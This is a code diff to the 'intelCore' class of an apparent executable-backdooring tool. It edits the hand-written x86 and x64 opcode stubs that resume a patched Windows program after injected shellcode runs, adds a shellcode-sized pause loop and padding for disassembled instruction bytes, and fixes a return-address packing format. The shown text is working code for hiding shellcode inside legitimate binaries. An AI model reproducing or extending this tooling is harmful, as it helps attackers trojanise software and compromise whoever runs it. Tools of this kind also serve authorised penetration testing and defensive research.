@@ -1,6 +1,6 @@
 '''
 
-Copyright (c) 2013-2014, Joshua Pitts
+Copyright (c) 2013-2015, Joshua Pitts
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
@@ -81,12 +81,20 @@ class intelCore():
         self.count = 0
         for k in md.disasm(self.f.read(12), self.flItms['VrtStrtngPnt']):
             self.count += k.size
+            _bytes = bytearray(b'')
+
+            if len(k.bytes) < k.size:
+                _bytes = bytearray(b"\x00" * (k.size - len(k.bytes)))
+
+            value_bytes = k.bytes + _bytes
+
             self.flItms['ImpList'].append([int(hex(k.address).strip('L'), 16),
                                           k.mnemonic.encode("utf-8"),
                                           k.op_str.encode("utf-8"),
                                           int(hex(k.address).strip('L'), 16) + k.size,
-                                          k.bytes,
+                                          value_bytes,
                                           k.size])
+
             if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                 break
 
@@ -103,12 +111,20 @@ class intelCore():
         md = Cs(CS_ARCH_X86, CS_MODE_64)
         for k in md.disasm(self.f.read(12), self.flItms['VrtStrtngPnt']):
             self.count += k.size
+            _bytes = bytearray(b'')
+
+            if len(k.bytes) < k.size:
+                _bytes = bytearray(b"\x00" * (k.size - len(k.bytes)))
+
+            value_bytes = k.bytes + _bytes
+
             self.flItms['ImpList'].append([int(hex(k.address).strip('L'), 16),
                                           k.mnemonic.encode("utf-8"),
                                           k.op_str.encode("utf-8"),
                                           int(hex(k.address).strip('L'), 16) + k.size,
-                                          k.bytes,
+                                          value_bytes,
                                           k.size])
+
             if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                 break
 
@@ -139,7 +155,14 @@ class intelCore():
         For x64 exes...
         """
         print "[*] Creating win64 resume execution stub"
+        #pause loop for code cave clearing stub
         resumeExe = ''
+        resumeExe += "\x51"             # push ecx
+        resumeExe += "\x48\xc7\xc1"             # mov ecx, value below
+        resumeExe += struct.pack("<I", (len(self.flItms['shellcode']) - 6))
+        resumeExe += "\xe2\xfe"         # loop back on itself
+        resumeExe += "\x59"             # pop ecx
+
         total_opcode_len = 0
         for item in self.flItms['ImpList']:
             startingPoint = item[0]
@@ -249,6 +272,12 @@ class intelCore():
         """
         print "[*] Creating win32 resume execution stub"
         resumeExe = ''
+        # buffer for zeroing shellcode (no performance impact)
+        resumeExe += "\x51"             # push ecx
+        resumeExe += "\xb9"             # mov ecx, value below
+        resumeExe += struct.pack("<I", (len(self.flItms['shellcode']) - 6))
+        resumeExe += "\xe2\xfe"         # loop back on itself
+        resumeExe += "\x59"             # pop ecx
         for item in self.flItms['ImpList']:
             startingPoint = item[0]
             OpCode = item[1]
@@ -361,7 +390,7 @@ class intelCore():
         resumeExe += "\x25"
         resumeExe += self.compliment_me  # zero out EAX
         resumeExe += "\x05"  # ADD
-        resumeExe += struct.pack('=i', ReturnTrackingAddress)
+        resumeExe += struct.pack('<I', ReturnTrackingAddress)
         resumeExe += "\x50"  # push eax
         resumeExe += "\x25"  # zero out EAX
         resumeExe += self.compliment_you
